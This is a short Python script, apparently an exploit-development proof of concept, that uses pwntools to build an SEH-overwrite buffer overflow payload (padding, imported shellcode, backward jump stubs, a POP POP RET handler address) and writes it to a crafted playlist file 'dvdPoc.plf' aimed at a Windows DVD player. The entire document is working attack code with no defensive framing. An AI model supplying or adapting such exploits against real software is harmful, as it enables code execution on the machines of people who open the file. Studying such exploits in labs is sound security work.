import pwn
from utils import shellcode_calc,shellcode2
uniq=b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3"

seh=pwn.p32(0x6164172e)#POPOPRET

#0012F5BC   6164172E  .da  SE handler
# seh_direct_jmp=pwn.p32(0x0012F5BC-4-len(shellcode2))

jmp_prev_5=b"\xeb\xf9\x90\x90"
jmp_prev_6=b"\xeb\xf8\x90\x90"
jmp_prev_355=bytes.fromhex("E9 98 FE FF FF")
jmp_prev_364=bytes.fromhex("E9 8F FE FF FF")
jmp_prev_220=bytes.fromhex("E9 1F FF FF FF")
jmp_prev_215=bytes.fromhex("E9 24 FF FF FF")
print(len(shellcode_calc))
nseh=jmp_prev_6
buffer = b"A"*(608-len(shellcode2)-len(jmp_prev_215)-1)+shellcode2+jmp_prev_364+b'\x90'+nseh+seh+b"B"*(702-608-len(nseh)-len(seh))
print(len(buffer))

filename = "dvdPoc.plf"
textfile = open(filename, 'wb')
textfile.write(buffer)
textfile.close()